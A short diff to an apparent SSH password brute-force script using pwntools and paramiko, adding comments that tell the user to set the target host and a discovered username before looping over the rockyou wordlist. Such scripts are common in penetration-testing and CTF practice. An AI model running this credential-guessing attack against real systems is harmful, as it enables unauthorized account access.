@@ -1,9 +1,9 @@
 from pwn import *
 import paramiko
 
-host = "127.0.0.1"
-username = "User"
-attempts = 0
+host = "127.0.0.1" #Change this with target host
+username = "User" #Change with discovered username
+attempts = 0  #Change this if need be
 
 with open("/usr/share/wordlists/rockyou.txt", "r", encoding='latin-1') as password_list:
     for password in password_list:
